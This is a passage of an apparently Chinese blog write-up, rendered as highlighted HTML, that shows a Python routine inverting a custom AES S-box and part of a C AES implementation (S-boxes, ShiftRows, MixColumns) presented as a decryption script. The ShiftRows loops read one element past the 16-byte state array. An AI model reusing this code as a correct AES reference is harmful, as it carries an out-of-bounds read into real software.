class="number">0x5c</span>,<span class="number">0xc2</span>,<span class="number">0xd3</span>,<span class="number">0xac</span>,<span class="number">0x62</span>,<span class="number">0x91</span>,<span class="number">0x95</span>,<span class="number">0xe4</span>,<span class="number">0x79</span>,<span class="number">0xe7</span>,<span class="number">0xc8</span>,<span class="number">0x37</span>,<span class="number">0x6d</span>,<span class="number">0x8d</span>,<span class="number">0xd5</span>,<span class="number">0x4e</span>,<span class="number">0xa9</span>,<span class="number">0x6c</span>,<span class="number">0x56</span>,<span class="number">0xf4</span>,<span class="number">0xea</span>,<span class="number">0x65</span>,<span class="number">0x7a</span>,<span class="number">0xae</span>,<span class="number">0x08</span>,<span class="number">0xba</span>,<span class="number">0x78</span>,<span class="number">0x25</span>,<span class="number">0x2e</span>,<span class="number">0x1c</span>,<span class="number">0xa6</span>,<span class="number">0xb4</span>,<span class="number">0xc6</span>,<span class="number">0xe8</span>,<span class="number">0xdd</span>,<span class="number">0x74</span>,<span class="number">0x1f</span>,<span class="number">0x4b</span>,<span class="number">0xbd</span>,<span class="number">0x8b</span>,<span class="number">0x8a</span>,<span class="number">0x70</span>,<span class="number">0x3e</span>,<span class="number">0xb5</span>,<span class="number">0x66</span>,<span class="number">0x48</span>,<span class="number">0x03</span>,<span class="number">0xf6</span>,<span class="number">0x0e</span>,<span class="number">0x61</span>,<span class="number">0x35</span>,<span class="number">0x57</span>,<span class="number">0xb9</span>,<span class="number">0x86</span>,<span class="number">0xc1</span>,<span class="number">0x1d</span>,<span class="number">0x9e</span>,<span class="number">0xe1</span>,<span class="number">0xf8</span>,<span class="number">0x98</span>,<span class="number">0x11</span>,<span class="number">0x69</span>,<span class="number">0xd9</span>,<span class="number">0x8e</span>,<span class="number">0x94</span>,<span class="number">0x9b</span>,<span class="number">0x1e</span>,<span class="number">0x87</span>,<span class="number">0xe9</span>,<span class="number">0xce</span>,<span class="number">0x55</span>,<span class="number">0x28</span>,<span class="number">0xdf</span>,<span class="number">0x8c</span>,<span class="number">0xa1</span>,<span class="number">0x89</span>,<span class="number">0x0d</span>,<span class="number">0xbf</span>,<span class="number">0xe6</span>,<span class="number">0x42</span>,<span class="number">0x68</span>,<span class="number">0x41</span>,<span class="number">0x99</span>,<span class="number">0x2d</span>,<span class="number">0x0f</span>,<span class="number">0xb0</span>,<span class="number">0x54</span>,<span class="number">0xbb</span>,<span class="number">0x16</span></span><br><span class="line">]</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line">new_contrary_sbox = [<span class="number">0</span>]*<span class="number">256</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">len</span>(new_s_box))</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>):</span><br><span class="line">    line = (new_s_box[i]&amp;<span class="number">0xf0</span>)&gt;&gt;<span class="number">4</span></span><br><span class="line">    rol = new_s_box[i]&amp;<span class="number">0xf</span></span><br><span class="line">    new_contrary_sbox[(line*<span class="number">16</span>)+rol] = i</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">len</span>(new_contrary_sbox))</span><br><span class="line"><span class="built_in">print</span>(new_contrary_sbox)</span><br><span class="line"><span class="built_in">print</span>(string.printable)</span><br></pre></td></tr></table></figure>
<p>aes解密脚本，每次解密一段</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> _CRT_SECURE_NO_WARNINGS</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">void</span> <span class="title function_">AddRoundKey</span><span class="params">(<span class="type">unsigned</span> <span class="type">char</span> *plaintext, <span class="type">unsigned</span> <span class="type">char</span> * CipherKey)</span><span class="comment">/*轮密钥加*/</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; <span class="number">16</span>; j++)  plaintext[j] = plaintext[j] ^ CipherKey[j];</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">SubBytes</span><span class="params">(<span class="type">unsigned</span> <span class="type">char</span> *plaintext, <span class="type">unsigned</span> <span class="type">char</span> *plaintextencrypt, <span class="type">int</span> count)</span><span class="comment">/*S盒置换*/</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">int</span> row, column;</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">char</span> Sbox[<span class="number">16</span>][<span class="number">16</span>] = &#123;</span><br><span class="line">		      <span class="comment">/* 0     1     2     3     4     5     6     7     8     9     a     b     c     d     e     f */</span></span><br><span class="line">		 <span class="number">0x63</span>,<span class="number">0x7c</span>,<span class="number">0x77</span>,<span class="number">0x7b</span>,<span class="number">0xf2</span>,<span class="number">0x6b</span>,<span class="number">0x6f</span>,<span class="number">0xc5</span>,<span class="number">0x30</span>,<span class="number">0x01</span>,<span class="number">0x67</span>,<span class="number">0x2b</span>,<span class="number">0xfe</span>,<span class="number">0xd7</span>,<span class="number">0xab</span>,<span class="number">0x76</span>,<span class="number">0xca</span>,<span class="number">0x82</span>,<span class="number">0xc9</span>,<span class="number">0x7d</span>,<span class="number">0xfa</span>,<span class="number">0x59</span>,<span class="number">0x47</span>,<span class="number">0xf0</span>,<span class="number">0xad</span>,<span class="number">0xd4</span>,<span class="number">0xa2</span>,<span class="number">0xaf</span>,<span class="number">0x9c</span>,<span class="number">0xa4</span>,<span class="number">0x72</span>,<span class="number">0xc0</span>,<span class="number">0xb7</span>,<span class="number">0xfd</span>,<span class="number">0x93</span>,<span class="number">0x26</span>,<span class="number">0x36</span>,<span class="number">0x3f</span>,<span class="number">0xf7</span>,<span class="number">0xcc</span>,<span class="number">0x34</span>,<span class="number">0xa5</span>,<span class="number">0xe5</span>,<span class="number">0xf1</span>,<span class="number">0x71</span>,<span class="number">0xd8</span>,<span class="number">0x31</span>,<span class="number">0x15</span>,<span class="number">0x04</span>,<span class="number">0xc7</span>,<span class="number">0x23</span>,<span class="number">0xc3</span>,<span class="number">0x18</span>,<span class="number">0x96</span>,<span class="number">0x05</span>,<span class="number">0x9a</span>,<span class="number">0x07</span>,<span class="number">0x12</span>,<span class="number">0x80</span>,<span class="number">0xe2</span>,<span class="number">0xeb</span>,<span class="number">0x27</span>,<span class="number">0xb2</span>,<span class="number">0x75</span>,<span class="number">0x09</span>,<span class="number">0x83</span>,<span class="number">0x2c</span>,<span class="number">0x1a</span>,<span class="number">0x1b</span>,<span class="number">0x6e</span>,<span class="number">0x5a</span>,<span class="number">0xa0</span>,<span class="number">0x52</span>,<span class="number">0x3b</span>,<span class="number">0xd6</span>,<span class="number">0xb3</span>,<span class="number">0x29</span>,<span class="number">0xe3</span>,<span class="number">0x2f</span>,<span class="number">0x84</span>,<span class="number">0x53</span>,<span class="number">0xd1</span>,<span class="number">0x00</span>,<span class="number">0xed</span>,<span class="number">0x20</span>,<span class="number">0xfc</span>,<span class="number">0xb1</span>,<span class="number">0x5b</span>,<span class="number">0x6a</span>,<span class="number">0xcb</span>,<span class="number">0xbe</span>,<span class="number">0x39</span>,<span class="number">0x4a</span>,<span class="number">0x4c</span>,<span class="number">0x58</span>,<span class="number">0xcf</span>,<span class="number">0xd0</span>,<span class="number">0xef</span>,<span class="number">0xaa</span>,<span class="number">0xfb</span>,<span class="number">0x43</span>,<span class="number">0x4d</span>,<span class="number">0x33</span>,<span class="number">0x85</span>,<span class="number">0x45</span>,<span class="number">0xf9</span>,<span class="number">0x02</span>,<span class="number">0x7f</span>,<span class="number">0x50</span>,<span class="number">0x3c</span>,<span class="number">0x9f</span>,<span class="number">0xa8</span>,<span class="number">0x51</span>,<span class="number">0xa3</span>,<span class="number">0x40</span>,<span class="number">0x8f</span>,<span class="number">0x92</span>,<span class="number">0x9d</span>,<span class="number">0x38</span>,<span class="number">0xf5</span>,<span class="number">0xbc</span>,<span class="number">0xb6</span>,<span class="number">0xda</span>,<span class="number">0x21</span>,<span class="number">0x10</span>,<span class="number">0xff</span>,<span class="number">0xf3</span>,<span class="number">0xd2</span>,<span class="number">0xcd</span>,<span class="number">0x0c</span>,<span class="number">0x13</span>,<span class="number">0xec</span>,<span class="number">0x5f</span>,<span class="number">0x97</span>,<span class="number">0x44</span>,<span class="number">0x17</span>,<span class="number">0xc4</span>,<span class="number">0xa7</span>,<span class="number">0x7e</span>,<span class="number">0x3d</span>,<span class="number">0x64</span>,<span class="number">0x5d</span>,<span class="number">0x19</span>,<span class="number">0x73</span>,<span class="number">0x60</span>,<span class="number">0x81</span>,<span class="number">0x4f</span>,<span class="number">0xdc</span>,<span class="number">0x22</span>,<span class="number">0x2a</span>,<span class="number">0x90</span>,<span class="number">0x88</span>,<span class="number">0x46</span>,<span class="number">0xee</span>,<span class="number">0xb8</span>,<span class="number">0x14</span>,<span class="number">0xde</span>,<span class="number">0x5e</span>,<span class="number">0x0b</span>,<span class="number">0xdb</span>,<span class="number">0xe0</span>,<span class="number">0x32</span>,<span class="number">0x3a</span>,<span class="number">0x0a</span>,<span class="number">0x49</span>,<span class="number">0x06</span>,<span class="number">0x24</span>,<span class="number">0x5c</span>,<span class="number">0xc2</span>,<span class="number">0xd3</span>,<span class="number">0xac</span>,<span class="number">0x62</span>,<span class="number">0x91</span>,<span class="number">0x95</span>,<span class="number">0xe4</span>,<span class="number">0x79</span>,<span class="number">0xe7</span>,<span class="number">0xc8</span>,<span class="number">0x37</span>,<span class="number">0x6d</span>,<span class="number">0x8d</span>,<span class="number">0xd5</span>,<span class="number">0x4e</span>,<span class="number">0xa9</span>,<span class="number">0x6c</span>,<span class="number">0x56</span>,<span class="number">0xf4</span>,<span class="number">0xea</span>,<span class="number">0x65</span>,<span class="number">0x7a</span>,<span class="number">0xae</span>,<span class="number">0x08</span>,<span class="number">0xba</span>,<span class="number">0x78</span>,<span class="number">0x25</span>,<span class="number">0x2e</span>,<span class="number">0x1c</span>,<span class="number">0xa6</span>,<span class="number">0xb4</span>,<span class="number">0xc6</span>,<span class="number">0xe8</span>,<span class="number">0xdd</span>,<span class="number">0x74</span>,<span class="number">0x1f</span>,<span class="number">0x4b</span>,<span class="number">0xbd</span>,<span class="number">0x8b</span>,<span class="number">0x8a</span>,<span class="number">0x70</span>,<span class="number">0x3e</span>,<span class="number">0xb5</span>,<span class="number">0x66</span>,<span class="number">0x48</span>,<span class="number">0x03</span>,<span class="number">0xf6</span>,<span class="number">0x0e</span>,<span class="number">0x61</span>,<span class="number">0x35</span>,<span class="number">0x57</span>,<span class="number">0xb9</span>,<span class="number">0x86</span>,<span class="number">0xc1</span>,<span class="number">0x1d</span>,<span class="number">0x9e</span>,<span class="number">0xe1</span>,<span class="number">0xf8</span>,<span class="number">0x98</span>,<span class="number">0x11</span>,<span class="number">0x69</span>,<span class="number">0xd9</span>,<span class="number">0x8e</span>,<span class="number">0x94</span>,<span class="number">0x9b</span>,<span class="number">0x1e</span>,<span class="number">0x87</span>,<span class="number">0xe9</span>,<span class="number">0xce</span>,<span class="number">0x55</span>,<span class="number">0x28</span>,<span class="number">0xdf</span>,<span class="number">0x8c</span>,<span class="number">0xa1</span>,<span class="number">0x89</span>,<span class="number">0x0d</span>,<span class="number">0xbf</span>,<span class="number">0xe6</span>,<span class="number">0x42</span>,<span class="number">0x68</span>,<span class="number">0x41</span>,<span class="number">0x99</span>,<span class="number">0x2d</span>,<span class="number">0x0f</span>,<span class="number">0xb0</span>,<span class="number">0x54</span>,<span class="number">0xbb</span>,<span class="number">0x16</span></span><br><span class="line">        </span><br><span class="line">        &#125;;<span class="comment">// 填充Sbox矩阵</span></span><br><span class="line">	<span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; count; i++)</span><br><span class="line">	&#123;</span><br><span class="line">		row = (plaintext[i] &amp; <span class="number">0xF0</span>) &gt;&gt; <span class="number">4</span>;</span><br><span class="line">		column = plaintext[i] &amp; <span class="number">0x0F</span>;</span><br><span class="line">		plaintextencrypt[i] = Sbox[row][column];</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">SubBytesRe</span><span class="params">(<span class="type">unsigned</span> <span class="type">char</span> *plaintext, <span class="type">unsigned</span> <span class="type">char</span> *plaintextencrypt, <span class="type">int</span> count)</span><span class="comment">/*S盒逆置换*/</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">int</span> row, column;</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">char</span> Sbox[<span class="number">16</span>][<span class="number">16</span>] = &#123;</span><br><span class="line">		<span class="number">82</span>, <span class="number">9</span>, <span class="number">106</span>, <span class="number">213</span>, <span class="number">48</span>, <span class="number">54</span>, <span class="number">165</span>, <span class="number">56</span>, <span class="number">191</span>, <span class="number">64</span>, <span class="number">163</span>, <span class="number">158</span>, <span class="number">129</span>, <span class="number">243</span>, <span class="number">215</span>, <span class="number">251</span>, <span class="number">124</span>, <span class="number">227</span>, <span class="number">57</span>, <span class="number">130</span>, <span class="number">155</span>, <span class="number">47</span>, <span class="number">255</span>, <span class="number">135</span>, <span class="number">52</span>, <span class="number">142</span>, <span class="number">67</span>, <span class="number">68</span>, <span class="number">196</span>, <span class="number">222</span>, <span class="number">233</span>, <span class="number">203</span>, <span class="number">84</span>, <span class="number">123</span>, <span class="number">148</span>, <span class="number">50</span>, <span class="number">166</span>, <span class="number">194</span>, <span class="number">35</span>, <span class="number">61</span>, <span class="number">238</span>, <span class="number">76</span>, <span class="number">149</span>, <span class="number">11</span>, <span class="number">66</span>, <span class="number">250</span>, <span class="number">195</span>, <span class="number">78</span>, <span class="number">8</span>, <span class="number">46</span>, <span class="number">161</span>, <span class="number">102</span>, <span class="number">40</span>, <span class="number">217</span>, <span class="number">36</span>, <span class="number">178</span>, <span class="number">118</span>, <span class="number">91</span>, <span class="number">162</span>, <span class="number">73</span>, <span class="number">109</span>, <span class="number">139</span>, <span class="number">209</span>, <span class="number">37</span>, <span class="number">114</span>, <span class="number">248</span>, <span class="number">246</span>, <span class="number">100</span>, <span class="number">134</span>, <span class="number">104</span>, <span class="number">152</span>, <span class="number">22</span>, <span class="number">212</span>, <span class="number">164</span>, <span class="number">92</span>, <span class="number">204</span>, <span class="number">93</span>, <span class="number">101</span>, <span class="number">182</span>, <span class="number">146</span>, <span class="number">108</span>, <span class="number">112</span>, <span class="number">72</span>, <span class="number">80</span>, <span class="number">253</span>, <span class="number">237</span>, <span class="number">185</span>, <span class="number">218</span>, <span class="number">94</span>, <span class="number">21</span>, <span class="number">70</span>, <span class="number">87</span>, <span class="number">167</span>, <span class="number">141</span>, <span class="number">157</span>, <span class="number">132</span>, <span class="number">144</span>, <span class="number">216</span>, <span class="number">171</span>, <span class="number">0</span>, <span class="number">140</span>, <span class="number">188</span>, <span class="number">211</span>, <span class="number">10</span>, <span class="number">247</span>, <span class="number">228</span>, <span class="number">88</span>, <span class="number">5</span>, <span class="number">184</span>, <span class="number">179</span>, <span class="number">69</span>, <span class="number">6</span>, <span class="number">208</span>, <span class="number">44</span>, <span class="number">30</span>, <span class="number">143</span>, <span class="number">202</span>, <span class="number">63</span>, <span class="number">15</span>, <span class="number">2</span>, <span class="number">193</span>, <span class="number">175</span>, <span class="number">189</span>, <span class="number">3</span>, <span class="number">1</span>, <span class="number">19</span>, <span class="number">138</span>, <span class="number">107</span>, <span class="number">58</span>, <span class="number">145</span>, <span class="number">17</span>, <span class="number">65</span>, <span class="number">79</span>, <span class="number">103</span>, <span class="number">220</span>, <span class="number">234</span>, <span class="number">151</span>, <span class="number">242</span>, <span class="number">207</span>, <span class="number">206</span>, <span class="number">240</span>, <span class="number">180</span>, <span class="number">230</span>, <span class="number">115</span>, <span class="number">150</span>, <span class="number">172</span>, <span class="number">116</span>, <span class="number">34</span>, <span class="number">231</span>, <span class="number">173</span>, <span class="number">53</span>, <span class="number">133</span>, <span class="number">226</span>, <span class="number">249</span>, <span class="number">55</span>, <span class="number">232</span>, <span class="number">28</span>, <span class="number">117</span>, <span class="number">223</span>, <span class="number">110</span>, <span class="number">71</span>, <span class="number">241</span>, <span class="number">26</span>, <span class="number">113</span>, <span class="number">29</span>, <span class="number">41</span>, <span class="number">197</span>, <span class="number">137</span>, <span class="number">111</span>, <span class="number">183</span>, <span class="number">98</span>, <span class="number">14</span>, <span class="number">170</span>, <span class="number">24</span>, <span class="number">190</span>, <span class="number">27</span>, <span class="number">252</span>, <span class="number">86</span>, <span class="number">62</span>, <span class="number">75</span>, <span class="number">198</span>, <span class="number">210</span>, <span class="number">121</span>, <span class="number">32</span>, <span class="number">154</span>, <span class="number">219</span>, <span class="number">192</span>, <span class="number">254</span>, <span class="number">120</span>, <span class="number">205</span>, <span class="number">90</span>, <span class="number">244</span>, <span class="number">31</span>, <span class="number">221</span>, <span class="number">168</span>, <span class="number">51</span>, <span class="number">136</span>, <span class="number">7</span>, <span class="number">199</span>, <span class="number">49</span>, <span class="number">177</span>, <span class="number">18</span>, <span class="number">16</span>, <span class="number">89</span>, <span class="number">39</span>, <span class="number">128</span>, <span class="number">236</span>, <span class="number">95</span>, <span class="number">96</span>, <span class="number">81</span>, <span class="number">127</span>, <span class="number">169</span>, <span class="number">25</span>, <span class="number">181</span>, <span class="number">74</span>, <span class="number">13</span>, <span class="number">45</span>, <span class="number">229</span>, <span class="number">122</span>, <span class="number">159</span>, <span class="number">147</span>, <span class="number">201</span>, <span class="number">156</span>, <span class="number">239</span>, <span class="number">160</span>, <span class="number">224</span>, <span class="number">59</span>, <span class="number">77</span>, <span class="number">174</span>, <span class="number">42</span>, <span class="number">245</span>, <span class="number">176</span>, <span class="number">200</span>, <span class="number">235</span>, <span class="number">187</span>, <span class="number">60</span>, <span class="number">131</span>, <span class="number">83</span>, <span class="number">153</span>, <span class="number">97</span>, <span class="number">23</span>, <span class="number">43</span>, <span class="number">4</span>, <span class="number">126</span>, <span class="number">186</span>, <span class="number">119</span>, <span class="number">214</span>, <span class="number">38</span>, <span class="number">225</span>, <span class="number">105</span>, <span class="number">20</span>, <span class="number">99</span>, <span class="number">85</span>, <span class="number">33</span>, <span class="number">12</span>, <span class="number">125</span>        &#125;;	<span class="comment">// 填充Sbox矩阵</span></span><br><span class="line">	<span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; count; i++)</span><br><span class="line">	&#123;</span><br><span class="line">		row = (plaintext[i] &amp; <span class="number">0xF0</span>) &gt;&gt; <span class="number">4</span>;</span><br><span class="line">		column = plaintext[i] &amp; <span class="number">0x0F</span>;</span><br><span class="line">		plaintextencrypt[i] = Sbox[row][column];</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">ShiftRowsRe</span><span class="params">(<span class="type">unsigned</span> <span class="type">char</span> *plaintextencrypt)</span><span class="comment">/*行移位的逆*/</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">char</span> temp = <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">4</span>; i++)<span class="comment">//第i行</span></span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; <span class="number">4</span> - i; j++)<span class="comment">//第j次左移</span></span><br><span class="line">		&#123;</span><br><span class="line">			temp = plaintextencrypt[i];</span><br><span class="line">			<span class="keyword">for</span> (<span class="type">int</span> k = <span class="number">0</span>; k &lt; <span class="number">4</span>; k++)</span><br><span class="line">				plaintextencrypt[i + <span class="number">4</span> * k] = plaintextencrypt[i + <span class="number">4</span> * (k + <span class="number">1</span>)];</span><br><span class="line">			plaintextencrypt[i + <span class="number">12</span>] = temp;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">ShiftRows</span><span class="params">(<span class="type">unsigned</span> <span class="type">char</span> *plaintextencrypt)</span><span class="comment">/*行移位*/</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">char</span> temp = <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">4</span>; i++)<span class="comment">//第i行</span></span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; i; j++)<span class="comment">//第j次左移</span></span><br><span class="line">		&#123;</span><br><span class="line">			temp = plaintextencrypt[i];</span><br><span class="line">			<span class="keyword">for</span> (<span class="type">int</span> k = <span class="number">0</span>; k &lt; <span class="number">4</span>; k++)</span><br><span class="line">				plaintextencrypt[i + <span class="number">4</span> * k] = plaintextencrypt[i + <span class="number">4</span> * (k + <span class="number">1</span>)];</span><br><span class="line">			plaintextencrypt[i + <span class="number">12</span>] = temp;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> <span class="title function_">Mult2</span><span class="params">(<span class="type">unsigned</span> <span class="type">char</span> num)</span><span class="comment">/*列混淆*/</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">char</span> temp = num &lt;&lt; <span class="number">1</span>;</span><br><span class="line">	<span class="keyword">if</span> ((num &gt;&gt; <span class="number">7</span>) &amp; <span class="number">0x01</span>)</span><br><span class="line">		temp = temp ^ <span class="number">27</span>;</span><br><span class="line">	<span class="keyword">return</span> temp;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> <span class="title function_">Mult3</span><span class="params">(<span class="type">unsigned</span> <span class="type">char</span> num)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">return</span> Mult2(num) ^ num;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">MixColumns</span><span class="params">(<span class="type">unsigned</span> <span class="type">char</span> *plaintextencrypt, <span class="type">unsigned</span> <span class="type">char</span> *plaintextcrypt)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="type">int</span> i;</span><br><span class="line">	<span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">4</span>; i++)</span><br><span class="line">		plaintextcrypt[<span class="number">4</span> * i] = Mult2(plaintextencrypt[<span class="number">4</span> * i]) ^ Mult3(plaintextencrypt[<span class="number">4</span> * i + <span class="number">1</span>]) ^ plaintextencrypt[<span class="number">4</span> * i + <span class="number">2</span>] ^ plaintextencrypt[<span class="number">4</span> * i + <span class="number">3</span>];</span><br><span class="line">	<span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">4</span>; i++)</span><br><span class="line">		plaintextcrypt[<span class="number">4</span> * i + <span class="number">1</span>] = plaintextencrypt[<span class="number">4</span> * i] ^ Mult2(plaintextencrypt[<span class="number">4</span> * i + <span class="number">1</span>]) ^ Mult3(plaintextencrypt[<span class="number">4</span> * i + <span class="number">2</span>]) ^ plaintextencrypt[<span class="number">4</span> * i + <span class="number">3</span>];</span><br><span class="line">	<span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">4</span>; i++)</span><br><span class="line">		plaintextcrypt[<span class="number">4</span> * i + <span class="number">2</span>] = plaintextencrypt[<span class="number">4</span> * i] ^ plaintextencrypt[<span class="number">4</span> * i + <span class="number">1</span>] ^ Mult2(plaintextencrypt[<span class="number">4</span> * i + <span class="number">2</span>]) ^ Mult3(plaintextencrypt[<span class="number">4</span> * i + <span class="number">3</span>]);</span><br><span class="line">	<span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">4</span>; i++)</span><br><span class="line">		plaintextcrypt[<span class="number">4</span> * i + <span class="number">3</span>] = Mult3(plaintextencrypt[<span class="number">4</span> * i]) ^ plaintextencrypt[<span class="number">4</span> * i + <span class="number">1</span>] ^ plaintextencrypt[<span class="number">4</span> * i + <span class="number">2</span>] ^ Mult2(plaintextencrypt[<span class="number">4</span> * i + <span class="number">3</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/*逆列混淆*/</span> </span><br><span class="line"><span class="meta">#<span class="keyword">define</span> xtime(x)   ((x<span class="string">&lt;&lt;1) ^ (((x&gt;</span>&gt;7) &amp; 1) * 0x1b))</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> Multiply(x,y) (((y &amp; 1) * x) ^ ((y&gt;&gt;1 &amp; 1) * xtime(x)) ^ ((y&gt;&gt;2 &amp; 1) * xtime(xtime(x))) ^ 